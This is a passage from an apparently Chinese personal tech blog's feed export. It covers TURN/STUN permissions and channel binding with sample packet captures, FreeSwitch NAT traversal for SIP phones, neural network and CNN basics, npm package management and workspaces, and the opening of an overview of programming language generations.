<ol start="2">
<li><strong>Send机制</strong><br>每个分配器（allocation）可以有多个授权（permission），每个授权包含一个peer的IP以及生存时间（lifetime，固定5min后过期），CreatePermission或ChannelBind会刷新授权，另外不允许主动删除授权。TURN权限借鉴了NAT的<code>address-restricted filtering</code>的机制，当TURN&#x2F;Server收到peer应答的数据时，只有源IP地址匹配到了授权，数据才会中继给TRUN&#x2F;Client。</li>
</ol>
<ul>
<li><p>Send&amp;Data<br>Send方法用于将数据从client发送到server（PeerB没有授权，数据被丢弃）；<br>Data方法用于将数据从server发送到client（PeerB没有授权，数据被丢弃）。</p>
<pre><code>TURN                                TURN           Peer          Peer
client                              server          A             B
  |                                   |             |             |
  |-- CreatePermission req (Peer A) -&gt;|             |             |
  |&lt;- CreatePermission success resp --|             |             |
  |                                   |             |             |
  |--- Send ind (Peer A)-------------&gt;|             |             |
  |                                   |=== data ===&gt;|             |
  |                                   |             |             |
  |                                   |&lt;== data ====|             |
  |&lt;------------- Data ind (Peer A) --|             |             |
  |                                   |             |             |
  |                                   |             |             |
  |--- Send ind (Peer B)-------------&gt;|             |             |
  |                                   | dropped     |             |
  |                                   |             |             |
  |                                   |&lt;== data ==================|
  |                           dropped |             |             |
  |                                   |             |             |
</code></pre>
</li>
<li><p>ChannelData<br>TURN&#x2F;Client为每个Peer绑定唯一的通道，并用4-byte头代替STUN头中继数据，提高了带宽利用率。通道有效期固定10min，重发ChannelBind会重新绑定通道，不允许删除通道。</p>
<pre><code>TURN                                TURN           Peer          Peer
client                              server          A             B
  |                                   |             |             |
  |-- ChannelBind req ---------------&gt;|             |             |
  | (Peer A to 0x5491)                |             |             |
  |                                   |             |             |
  |&lt;---------- ChannelBind succ resp -|             |             |
  |                                   |             |             |
  |-- (0x5491) ChannelData ----------&gt;|             |             |
  |                                   |=== data ===&gt;|             |
  |                                   |             |             |
  |                                   |&lt;== data ====|             |
  |&lt;----------- (0x5491) ChannelData -|             |             |
  |                                   |             |             |
  |--- Send ind (Peer A)-------------&gt;|             |             |
  |                                   |=== data ===&gt;|             |
  |                                   |             |             |
  |                                   |&lt;== data ====|             |
  |&lt;----------- (0x5491) ChannelData -|             |             |
  |                                   |             |             |
</code></pre>
</li>
</ul>
<div class="tabs" id="turn-channeldata"><ul class="nav-tabs"><li class="tab active"><a href="#turn-channeldata-1">CreatePermission</a></li><li class="tab"><a href="#turn-channeldata-2">Channel-Bind</a></li><li class="tab"><a href="#turn-channeldata-3">ChannelData</a></li></ul><div class="tab-content"><div class="tab-pane active" id="turn-channeldata-1"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># STUN-Client: 为Peer申请权限</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.5.220, Dst: 192.168.5.220</span><br><span class="line">User Datagram Protocol, Src Port: 37740, Dst Port: 3478</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    Message Type: 0x0008 (CreatePermission Request)</span><br><span class="line">    Message Length: 100</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: 471d6fcdccf84ac50c55b540</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        XOR-PEER-ADDRESS: 0.0.0.0:3480</span><br><span class="line">        USERNAME: coturn</span><br><span class="line">        NONCE: bee374e6bc8bd352</span><br><span class="line">        REALM: coturn.imssyang.com</span><br><span class="line">        MESSAGE-INTEGRITY: d7e8a5c26d2978cbbf574187cab99ca6df691c75</span><br><span class="line">        FINGERPRINT: 0x0f829ff5</span><br><span class="line"></span><br><span class="line"># STUN-Server: 申请权限成功</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.5.220, Dst: 192.168.5.220</span><br><span class="line">User Datagram Protocol, Src Port: 3478, Dst Port: 37740</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    Message Type: 0x0108 (CreatePermission Success Response)</span><br><span class="line">    Message Length: 64</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: 471d6fcdccf84ac50c55b540</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        MESSAGE-INTEGRITY: 98ecd6f7449db4ce1f541b9d12fbd418a36a7a41</span><br><span class="line">        FINGERPRINT: 0x32fec50a</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="turn-channeldata-2"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># STUN-Client: 将Peer绑定到0x5491通道</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.5.220, Dst: 192.168.5.220</span><br><span class="line">User Datagram Protocol, Src Port: 37740, Dst Port: 3478</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    Message Type: 0x0009 (Channel-Bind Request)</span><br><span class="line">    Message Length: 108</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: 8dbcd1b4cf1602673eff32c1</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        CHANNEL-NUMBER: 0x5491</span><br><span class="line">        XOR-PEER-ADDRESS: 0.0.0.0:3480</span><br><span class="line">        USERNAME: coturn</span><br><span class="line">        NONCE: bee374e6bc8bd352</span><br><span class="line">        REALM: coturn.imssyang.com</span><br><span class="line">        MESSAGE-INTEGRITY: 619782b11427ebbd4d0d47456fa41e9f187a2094</span><br><span class="line">        FINGERPRINT: 0x62fe9dfa</span><br><span class="line"></span><br><span class="line"># STUN-Server: 绑定到通道成功</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.5.220, Dst: 192.168.5.220</span><br><span class="line">User Datagram Protocol, Src Port: 3478, Dst Port: 37740</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    Message Type: 0x0109 (Channel-Bind Success Response)</span><br><span class="line">    Message Length: 64</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: 8dbcd1b4cf1602673eff32c1</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        MESSAGE-INTEGRITY: 1d766a42b8d391da79264d3d303ca84a70f33308</span><br><span class="line">        FINGERPRINT: 0x094d6041</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="turn-channeldata-3"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># STUN-Client: 使用0x5491通道发送数据</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.5.220, Dst: 192.168.5.220</span><br><span class="line">User Datagram Protocol, Src Port: 37740, Dst Port: 3478</span><br><span class="line">Session Traversal Utilities for NAT, TURN ChannelData Message</span><br><span class="line">    Channel Number: 0x5491</span><br><span class="line">    Message Length: 100</span><br><span class="line">Data (100 bytes)</span><br><span class="line">    Data: 00000000070707077e15000000000000070707070707070707070...</span><br></pre></td></tr></table></figure></div></div></div>

<p><a href="https://www.liavaag.org/English/SHA-Generator/HMAC/">Online HMAC Generator</a><br><a href="http://nwsmith.blogspot.com/2012/07/using-openssl-to-generate-hmac-using.html">Using openssl to generate HMAC using a binary key</a></p>
<h1 id="ICE规范"><a href="#ICE规范" class="headerlink" title="ICE规范"></a>ICE规范</h1><p><a href="https://www.rfc-editor.org/rfc/rfc8445">RFC8445 Interactive Connectivity Establishment (ICE): A Protocol for Network Address Translator (NAT) Traversal (2018)</a></p>
<h1 id="freeswitch"><a href="#freeswitch" class="headerlink" title="freeswitch"></a>freeswitch</h1><ul>
<li><p><strong>场景A</strong>: 话机运行在内网，穿过NAT与公网上的FreeSwitch（运营VoIP）对接。</p>
<pre><code>       话机:192.168.0.2 --NAT:1.2.3.4-- Internet -- 1.2.3.5:FreeSwitch -- 外部网关
</code></pre>
<ul>
<li><p>话机向FreeSwitch注册时：</p>
<pre><code>     REGISTER 1000@1.2.3.5 SIP/2.0
     Contact: 1000@192.168.0.2:5060
</code></pre>
<p>此时，FreeSwitch记住了Contact地址，后续呼叫1000的INVITE请求发往192.168.0.2，因为存在NAT会导致呼不通问题。</p>
<p>解决方式：</p>
<ol>
<li>话机先通过STUN服务获取到被NAT设备映射完的外网地址：UDP 1.2.3.4:5060，然后在注册请求中直接携带外网地址。</li>
<li>FreeSwitch发现注册请求实际从外网地址：UDP 1.2.3.4:5060发出，后续呼叫发往这个外网地址上。配置<code>&lt;param name=&quot;apply-nat-acl&quot; value=&quot;nat.auto&quot;&gt;</code>后，FreeSwitch会判断Contact地址为RFC1918规定的私网地址时，将其自动替换为SIP包的来源地址。</li>
</ol>
</li>
<li><p>话机向FreeSwitch注册时（Via字段携带rport字段，需话机支持sip&#x2F;rport功能）：</p>
<pre><code>     REGISTER 1000@1.2.3.5 SIP/2.0
     Via: SIP/2.0/UDP 192.168.0.2:5060;branch=z9d851;rport
     Contact: &lt;sip:1000@192.168.0.2:5060;rinstance=6622cfa07990b53c&gt;
</code></pre>
<p>FreeSwitch应答时，会将应答包发往SIP请求的实际来源地址，并将实际来源端口设置为Via头部的rport的值，同时增加参数received&#x3D;实际来源IP：</p>
<pre><code>     SIP/2.0 200 OK
     Via: SIP/2.0/UDP 192.168.0.2:56020;branch=z9d851;rport=5060;received=1.2.3.4
</code></pre>
<p>SIP客户端收到应答后，即知道了自己的外网地址，后续在重发的注册信息中，Contact地址直接填外网地址。</p>
</li>
<li><p>话机呼叫FreeSwitch时：</p>
<pre><code>     INVITE 9196@1.2.3.5 SIP/2.0
     Content-Type: application/sdp

     c=IN IP4 192.168.0.2
     m=audio 50452 RTP/AVP 8 0 101
</code></pre>
<p>此时，因为存在NAT会导致FreeSwitch无法向192.168.0.2发送RTP包。</p>
<p>解决方式：</p>
<ol>
<li>话机先通过STUN服务获取到RTP流被NAT设备映射完的外网地址：UDP 1.2.3.4:50452，然后在sdp信息中直接携带外网地址。</li>
<li>FreeSwitch在收到第一个RTP包后，记住RTP包实际从外网地址：UDP 1.2.3.4:50452发出，后续所有RTP包后发往这个外网地址上。</li>
</ol>
</li>
</ul>
</li>
<li><p><strong>场景B</strong>：话机和FreeSwitch运行在内网（公司内部IP-PBX），穿过NAT与公网上的设备对接。</p>
<pre><code>   话机 -- FreeSwitch --NAT-- Internet -- 外部网关
</code></pre>
<p>FreeSwitch支持通过uPnP或NAT-PMP协议在路由器上打洞，打洞完成后就知道将要映射的外网地址了。</p>
<pre><code>   &lt;param name=&quot;ext-sip-ip&quot; value=&quot;auto-nat&quot;/&gt;
   &lt;param name=&quot;ext-rtp-ip&quot; value=&quot;auto-nat&quot;/&gt;
</code></pre>
<p>FreeSwitch也支持通过STUN服务器获取外网地址：</p>
<pre><code>   &lt;param name=&quot;ext-sip-ip&quot; value=&quot;stun:stun.freeswitch.org&quot;/&gt;
   &lt;param name=&quot;ext-rtp-ip&quot; value=&quot;stun:stun.freeswitch.org&quot;/&gt;
</code></pre>
</li>
</ul>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>NAT</tag>
      </tags>
  </entry>
  <entry>
    <title>神经网络基础</title>
    <url>/NeuralNetwork/Basic.html</url>
    <content><![CDATA[<p>人工神经网络（ANNs - artificial neural networks）是一种受大脑中的生物神经网络结构启发的计算系统，基于人工神经元节点的集合，模拟生物大脑中的神经元，试图执行传统算法几乎没有成功过的任务。</p>
<span id="more"></span>

<h1 id="发展历史"><a href="#发展历史" class="headerlink" title="发展历史"></a>发展历史</h1><ul>
<li>1969年人工感知器研究陷入停滞，因为计算机性能不足，无法训练出有用的神经网络；</li>
<li>1988年神经网络用于蛋白质结构预测领域；</li>
<li>1992年神经网络用于三维物体识别，随后又应用在股票预测和自动驾驶领域；</li>
<li>2012年后，随着GPU和分布式计算能力的增强，使得可以训练更大的神经网络，特别是图像和视觉识别问题上；</li>
</ul>
<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><ul>
<li>信号（signal)：实数表示，每个神经元的输出是它的输入之和的某个非线性函数，强弱通过权重（weight）表示。</li>
<li>神经元（neurons）：接收多个信号，计算加权和（称为激活），达到阈值（threshold）后，向与之连接的神经元发送信号（多输入单输出）。</li>
<li>边（edge）：由神经元相互的连接组成。</li>
<li>层（layer）：由神经元聚集形成，每一层都对输入进行特定的转换。<ul>
<li>输入层（input layer）：接受外部数据的层；</li>
<li>输出层（output layer）：产生目标结果的层；</li>
<li>隐藏层（hidden layer）：输入层与输出层之间的层（&gt;&#x3D;0）;</li>
<li>完全连接（fully connected）：每一层的每个神经元都连接到下一层的每个神经元；</li>
<li>池化连接（pooling connected）：每一层的一组神经元连接到下一层的一个神经元（神经元数量逐渐减少）；</li>
<li>前馈网络（feedforward network）：仅有池化连接组成的神经网络（有向无环图，directed acyclic graph）；</li>
<li>循环网络（recurrent network）：允许同一层或前一层神经元之间连接的网络；</li>
</ul>
</li>
</ul>
<h2 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h2><p>神经网络可以通过示例进行学习，在input和result之间形成概率加权关联，这些关联存储在网络本身的数据结构中。</p>
<ul>
<li>激活（activation）：在神经元内部，首先计算所有输入的加权和（weighted sum），并加上一个偏差项（bias）的过程；</li>
<li>激活函数（activation function）：在神经元内部，加权和经激活函数转换后产生输出结果；</li>
<li>超参数（hyperparameter）：在学习过程开始前设置的常量参数，例如学习速率、隐藏层数、批处理大小等；</li>
<li>预测（prediction）：特定示例中神经网络的输出结果；</li>
<li>误差（error）：预测与目标结果的差别；</li>
<li>调整（adjust）：根据学习规则和误差值调整网络的加权关联；</li>
<li>学习率（learning rate）：定义了模型为了调整每次观察的误差而采取的校正步骤的大小；</li>
<li>代价函数（cost function）：在学习过程中，定期评估误差率变化的函数，只要误差下降，就应该继续学习；</li>
<li>反向传播（backpropagation）：一种用来调整连接权值来补偿学习过程中发现的每一个错误的方法，通常是计算代价函数的梯度（导数）；</li>
</ul>
<h3 id="学习范式"><a href="#学习范式" class="headerlink" title="学习范式"></a>学习范式</h3><ul>
<li>监督学习（supervised learning）：使用一组成对的输入和期望的输出，通过均方差（mean-squared error）作为代价函数评估误差；<ul>
<li>适合模式识别（pattern recognition, or classification）和回归（regression, or function approximation）；</li>
<li>适合顺序数据，例如手写、语音识别和手势识别；</li>
</ul>
</li>
<li>无监督学习（unsupervised learning）</li>
<li>强化学习（reinforcement learning）</li>
<li>自学习（self-learning）</li>
<li>神经演化（neuroevolution）</li>
</ul>
<h1 id="卷积神经网络"><a href="#卷积神经网络" class="headerlink" title="卷积神经网络"></a>卷积神经网络</h1><p><a href="https://betterexplained.com/articles/intuitive-convolution/">Intuitive Guide to Convolution</a><br><a href="https://mlnotebook.github.io/post/CNN1/">Convolutional Neural Networks - Basics</a></p>
<p>卷积神经网络（cnn - convolutional neural network）在至少一层中使用卷积（convolution）代替矩阵乘法进行运算，常用来分析视觉图像，是专门设计处理像素数据的。</p>
<ul>
<li>网络结构：<ul>
<li>输入是一个具有形状的张量（tensor）：输入数量 * 输入高 * 输入宽 * 输入通道；</li>
<li>卷积层（convolutional layer）：对输入进行卷积后，将结果传递到下一层（类似于视觉皮层神经元对特定刺激的反应）；<ul>
<li>接收域（receptive field）：在卷积层中，每个神经元只接收来自前一层中一个被称为神经元接收域的受限区域（通常为5x5）的输入；</li>
<li>滤波器（filter, or kernel）：在前向传递期间，每个滤波器在输入体积的宽度和高度上进行卷积，生成该滤波器的二维激活图；</li>
</ul>
</li>
<li>特征图（feature map, or activation map）：经过卷积层后，图像被抽象成特征图 - 输入数量 * 特征图的高 * 特征图的宽 * 特征图的通道;</li>
<li>池化层（pooling layer）：将一层的神经元簇组合后输出成下一层的单个神经元，从而降低数据维度；</li>
<li>整流线性单元层（ReLU, rectified linear unit layer）：应用激活函数f(x)&#x3D;max(0, x)，移除了特征图中的负值；</li>
</ul>
</li>
<li>超参数（hyperparameter）：<ul>
<li>核大小（kernel size)：一起处理的像素数量，通常为核的维数，例如2x2、3x3等；</li>
<li>填充（padding）：指在图像边框上添加0值像素；</li>
<li>步幅（stride）：指分析窗口在每次迭代中移动的像素数，例如步幅为2意味着每个核与它的前一个核的偏移量为2个像素；</li>
<li>滤波器数量（number of filter）：由于特征图大小随深度而减少，靠近输入层的图层往往有更少的滤波器；</li>
<li>滤波器大小（filter size）：通常根据数据集来选择；</li>
<li>池化类型和大小（pooling type and size）：通常使用Max池，2x2维度，这样可以最大化减少采样，降低处理成本；</li>
</ul>
</li>
</ul>
<h1 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h1><p>深度学习是机器学习（machine learning）的一个分支，在基于人工神经网络（特别是CNN）研究中，“deep”指数据被转换的层数（layers）或者说转换链（credit assignment path, CAP &gt; 2）比较大，每一层将其输入数据转换为更抽象和复合的数据表示。</p>
<ul>
<li>历史：<ul>
<li>“深度学习”术语在1986年被<code>Rina Dechter</code>引入机器学习（machine learning）领域；</li>
<li>1989年<code>Yann LeCun</code>将反向传播算法应用到深度神经网络，以识别邮件上手写的邮政编码；</li>
<li>1998年<code>Larry Heck</code>将深度神经网络应用在语音处理中，工业上大规模语音识别应用出现在2000年；</li>
<li>2009年硬件进步重新激发了人们对深度学习的兴趣，深度神经网络可以使用Nvidia GPUs进行训练；</li>
</ul>
</li>
<li>图像识别示例：<ul>
<li>输入像素矩阵；</li>
<li>第一层：对像素进行抽象并对边缘进行编码；</li>
<li>第二层：对编码边缘排列和组合；</li>
<li>第三层：编码鼻子和眼睛；</li>
<li>第四层：识别图像中有一张脸；</li>
</ul>
</li>
</ul>
<h1 id="cuDNN"><a href="#cuDNN" class="headerlink" title="cuDNN"></a>cuDNN</h1><p><a href="https://docs.nvidia.com/deeplearning/cudnn/developer-guide/index.html">NVIDIA cuDNN documention</a></p>
<p>cuDNN (CUDA Deep Neural Network Library) 是用于深度神经网络的GPU加速库，实现了DNN应用中频繁使用的例程的高度优化实现:</p>
<ul>
<li>前后向卷积（Convolution forward and backward）</li>
<li>矩阵乘法（Matrix multiplication）</li>
<li>张量变换函数（Tensor transformation functions）</li>
<li>神经元前后激活（Neuron activations forward and backward）：relu, tanh, sigmoid, elu, gelu, softplus, swish</li>
</ul>
<h1 id="PyTorch"><a href="#PyTorch" class="headerlink" title="PyTorch"></a>PyTorch</h1><h1 id="TensorRT"><a href="#TensorRT" class="headerlink" title="TensorRT"></a>TensorRT</h1><ul>
<li><p>NVIDIA TensorRT是一套在GPU上进行高性能推理的C++库。</p>
</li>
<li><p><a href="https://docs.nvidia.com/deeplearning/tensorrt/release-notes/overview.html">发布说明</a>：</p>
<ul>
<li>EA(Early Acess)是早期测试和反馈的版本；</li>
<li>RC(Release Candidate)是预发产品版本；</li>
<li>GA(General Availability)是正式产品版本；</li>
</ul>
</li>
<li><p><a href="https://docs.nvidia.com/deeplearning/tensorrt/install-guide/index.html">安装指导</a>:</p>
<ul>
<li>依赖环境：<ul>
<li>CUDA</li>
<li>cuDNN</li>
<li>Python</li>
<li>依赖PyCUDA: <ul>
<li><code>pip install numpy</code></li>
<li><code>pip install &#39;pycuda&lt;2021.1&#39;</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p><a href="https://docs.nvidia.com/deeplearning/tensorrt/quick-start-guide/index.html">快速入门</a>:</p>
</li>
</ul>
]]></content>
      <categories>
        <category>NeuralNetwork</category>
      </categories>
      <tags>
        <tag>NeuralNetwork</tag>
        <tag>cuDNN</tag>
      </tags>
  </entry>
  <entry>
    <title>npm包管理工具</title>
    <url>/Node/npm.html</url>
    <content><![CDATA[<p>website: <a href="https://www.npmjs.com/">https://www.npmjs.com</a></p>
<span id="more"></span>

<h1 id="包（package）"><a href="#包（package）" class="headerlink" title="包（package）"></a>包（package）</h1><ul>
<li>包中必须包含一个<code>package.json</code>文件，用于发布到npm registry</li>
<li>包可以是file或directory，可以归属于user或organization，也可以是private或public</li>
<li>包可以是以下格式（formats):<ul>
<li>一个包含package.json和对应的程序的目录</li>
<li>一个上述目录对应的gzip压缩文件</li>
<li>一个registry上的标识<ul>
<li>url地址</li>
<li><code>&lt;name&gt;@&lt;version&gt;</code></li>
<li><code>&lt;name&gt;@&lt;tag&gt;</code></li>
<li><code>&lt;name&gt;(默认latest)</code></li>
</ul>
</li>
<li>一个<code>git</code>仓库地址（默认master分支）<ul>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="作用域（scope）"><a href="#作用域（scope）" class="headerlink" title="作用域（scope）"></a>作用域（scope）</h2><ul>
<li>npm v2+版本支持作用域，以前缀<code>@</code>且后缀<code>/</code>的形式放在package名前，用于避免名称冲突<ul>
<li><code>@npm/package-name</code> (npm作用域下的包)</li>
</ul>
</li>
<li>private包一定有scope，unscoped的包一定是public的</li>
<li><code>npm access public &lt;package-name&gt;</code>将private包更改为public</li>
<li><code>npm access restricted &lt;package-name&gt;</code>将public包更改为private</li>
</ul>
<h2 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h2><p><a href="https://docs.npmjs.com/cli/v8/configuring-npm/package-json">Specifics of npm’s package.json handling</a><br><a href="https://docs.npmjs.com/creating-a-package-json-file">Creating a package.json file</a></p>
<ul>
<li>创建<ul>
<li>在包目录下执行<code>npm init</code><ul>
<li><code>--yes</code>选项按默认值生成</li>
<li><code>--scope=@scope-name</code>生成scoped模块</li>
</ul>
</li>
<li><code>~/.npm-init.js</code>文件可定制上述命令执行后生成的文件内容</li>
<li>常见配置：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm set init.author.email &quot;example-user@example.com&quot;</span><br><span class="line">npm set init.author.name &quot;example_user&quot;</span><br><span class="line">npm set init.license &quot;MIT&quot;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>字段：<ul>
<li><strong>name</strong> 由小写字母、<code>-</code>、<code>_</code>字符组成的包名，习惯用包所在的目录名</li>
<li>description 描述信息</li>
<li><strong>version</strong> <code>x.x.x</code>格式的版本，默认<code>1.0.0</code> <a href="https://semver.org/">Semantic Versioning 2.0.0</a></li>
<li>scripts 可执行脚本</li>
<li>dependencies 产品中的依赖，执行<code>npm install</code>时会自动下载，<code>--save-prod</code>选项自动添加<code>package.json</code></li>
<li>devDependencies 本地开发环境中的依赖，执行<code>npm install</code>时会自动下载，<code>--save-dev</code>选项自动添加到<code>package.json</code></li>
<li>keywords 检索时的关键字</li>
<li>author 推荐<code>name &lt;email&gt; (website)</code>格式</li>
<li>license 许可证</li>
<li>bugs bug信息</li>
<li>homepage 主页信息</li>
</ul>
</li>
</ul>
<h2 id="发布（publish）"><a href="#发布（publish）" class="headerlink" title="发布（publish）"></a>发布（publish）</h2><ul>
<li><code>npm publish</code>发布private或unscoped的包</li>
<li><code>npm publish --access public</code>发布scoped的公共包</li>
<li><code>npm publish --tag &lt;tag&gt;</code>发布到指定tag(默认latest)</li>
<li><code>npm dist-tag add &lt;package-name&gt;@&lt;version&gt; [&lt;tag&gt;]</code>为指定的版本打tag</li>
</ul>
<h1 id="模块（module）"><a href="#模块（module）" class="headerlink" title="模块（module）"></a>模块（module）</h1><ul>
<li>模块是在node_modules目录下的文件或目录，可通过<code>require()</code>函数加载<ul>
<li>node_modules&#x2F;a.js （a文件是模块，不是包）</li>
<li>node_modules&#x2F;b&#x2F; （b目录是模块，不一定是包）</li>
<li>node_modules&#x2F;c&#x2F;package.json （c目录是模块，也是包）</li>
<li>node_modules&#x2F;@myscope&#x2F;d&#x2F;package.json （d目录是scope包）<ul>
<li><code>package.json</code>文件必须有main字段</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h1><p><a href="https://docs.npmjs.com/cli/v8/commands">CLI commands</a><br><a href="https://docs.npmjs.com/cli/v8/commands/npm-exec">(exec) Run a command from a local or remote npm package</a><br><a href="https://docs.npmjs.com/cli/v8/commands/npm-install">(install) Install a package</a><br><a href="https://docs.npmjs.com/cli/v8/commands/npm-link">(link) Symlink a package folder</a></p>
<p>javascript包管理器（package manager）<br>javascript公共数据库 <a href="https://registry.npmjs.org/">https://registry.npmjs.org (default)</a></p>
<ul>
<li>包依赖<ul>
<li>当包依赖中有git地址，npm会自动调用git命令进行安装</li>
<li>当包依赖中有本地待编译的C++模块时，通过<a href="https://github.com/nodejs/node-gyp">node-gyp</a>包可以自动编译它</li>
<li>查看当前项目中的包依赖：<code>npm explain &lt;package&gt;</code></li>
</ul>
</li>
<li>安装包: <code>npm install</code><ul>
<li>本地安装：可通过<code>require()</code>调用它<ul>
<li>包被安装到当前项目的<code>./node_modules</code></li>
<li>可执行程序被安装到当前项目的<code>./node_modules/.bin</code></li>
<li>工作目录：遍历目录树，寻找包含<code>package.json</code>或<code>node_modules</code>的目录作为工作目录</li>
</ul>
</li>
<li>全局安装：可通过命令行调用它<ul>
<li>包被安装到 <code>$npm_config_prefix/lib/node_modules</code></li>
<li>可执行程序被安装到 <code>$npm_config_prefix/bin</code></li>
<li>man文档被安装到 <code>$npm_config_prefix/share/man</code></li>
</ul>
</li>
</ul>
</li>
<li>链接包：<code>npm link</code><ul>
<li>创建全局链接：<code>cd &lt;package&gt;; npm link</code><ul>
<li>包的全局链接：<code>&#123;prefix&#125;/lib/node_modules/&lt;package&gt; 指向 &lt;project&gt;</code></li>
<li>可执行文件链接：<code>&#123;prefix&#125;/bin/&#123;name&#125; -&gt; &lt;project&gt;/bin/&#123;name&#125;</code></li>
</ul>
</li>
<li>链接全局包：<code>npm link &lt;package&gt;</code> 在当前项目下创建全局包的链接</li>
</ul>
</li>
<li>包缓存：<code>npm cache</code><ul>
<li>缓存目录：<code>~/.npm</code></li>
</ul>
</li>
<li>配置npm：通过<code>npm config ls -l</code>查看<ul>
<li>通过命令行选项：<code>--&lt;key&gt; &lt;val&gt;（默认true）</code></li>
<li>通过环境变量：<code>export npm_config_&lt;key&gt;=&lt;val&gt;</code></li>
<li>通过项目配置：<code>&lt;project&gt;/.npmrc</code></li>
<li>通过用户配置：<code>~/.npmrc</code></li>
<li>通过全局配置：<code>$npm_config_prefix/etc/npmrc</code></li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install &lt;package&gt;     本地安装（dependencies&amp;devDependencies）</span><br><span class="line">npm install -g &lt;package&gt;  全局安装</span><br><span class="line">npm install --only=prod   只安装dependencies</span><br><span class="line">npm install --only=dev    只安装devDependencies</span><br><span class="line">npm search &lt;package&gt;      搜索包</span><br><span class="line">npm ls                    列出安装的包</span><br><span class="line">npm config ls -l          列出所有配置项</span><br><span class="line">npm exec -- foo@latest bar --package=@npmcli/foo -&gt; foo bar --package=@npmcli/foo 运行foo包</span><br><span class="line">npx foo@latest bar --package=@npmcli/foo         -&gt; foo bar --package=@npmcli/foo 运行foo包</span><br></pre></td></tr></table></figure>

<h2 id="Workspaces"><a href="#Workspaces" class="headerlink" title="Workspaces"></a>Workspaces</h2><p><a href="https://docs.npmjs.com/cli/v8/using-npm/workspaces">npm&#x2F;workspaces</a><br><a href="https://en.wikipedia.org/wiki/Monorepo">wiki&#x2F;monorepo</a><br><a href="https://ruanmartinelli.com/posts/npm-7-workspaces-1">Getting Started with npm Workspaces</a></p>
<ul>
<li>npm v7+支持workspaces：一个<code>package.json</code>文件可以管理多个包（monorepo策略）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm run test -ws/--workspaces                     # Run &quot;test&quot; script on all packages</span><br><span class="line">npm run test -w/--workspace package-a             # Runs &quot;test&quot; only on package-a</span><br><span class="line">npm install lodash --workspace package-a          # Install &quot;lodash&quot; on package-a</span><br><span class="line">npm install tap --workspace package-b --save-dev  # Install &quot;tap&quot; on package-b as a dev dependency</span><br><span class="line">npm install package-a --workspace package-b       # Install package-a on package-b</span><br><span class="line">npm install eslint --workspaces                   # Install &quot;eslint&quot; in all packages</span><br></pre></td></tr></table></figure>

<h1 id="lerna"><a href="#lerna" class="headerlink" title="lerna"></a>lerna</h1><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://docs.npmjs.com/">npm Docs</a></p>
]]></content>
      <categories>
        <category>Node</category>
      </categories>
      <tags>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>编程语言概述</title>
    <url>/ProgrammingLanguage/Overview.html</url>
    <content><![CDATA[<p>编程语言在演化过程中，抽象层次逐步递增，演化出各种编程范式，这些专有名词常常出现，为了更好的理解这些内容，理清其中的脉络，整理出这篇概述性的文章。</p>
<span id="more"></span>

<h1 id="演化"><a href="#演化" class="headerlink" title="演化"></a>演化</h1><p>每一代的定义随着编程风格的日益强大逐渐演化，定义也随之进行修正。</p>
<ul>
<li>第一代（<code>1GL, First Generation</code>）<ul>
<li>机器层次，编码<strong>更适合机器理解</strong>，编码直接被<code>CPU</code>执行，速度快，但难以修复错误且可移植性低。</li>
<li>通过前置面板的开关控制进行机器码编程。目前在驱动、固件接口以及硬件设备领域仍有应用。</li>
</ul>
</li>
<li>第二代（<code>2GL, Second Generation</code>）<ul>
<li>针对<code>CPU</code><strong>指令编程</strong>，因此代码可被人读写，必须<strong>汇编（<code>assembly</code>）</strong>为机器码后才可运行。</li>
<li>由于需要关注更多硬件细节，因此容易产生<code>bug</code>，且编码特定于具体的<code>CPU</code>架构。目前在内核、驱动、视图等领域应用。</li>
</ul>
</li>
<li>第三代（<code>3GL, Third Generation</code>）<ul>
<li>追求更好的<strong>可移植性（<code>machine-independent</code>）</strong>和<strong>易于人理解（<code>programmer-friendly</code>）</strong>的编码；</li>
<li>需要<strong>编译（<code>compilation</code>）</strong>或<strong>解释（<code>interpretation</code>）</strong>执行，抽象层级更高；</li>
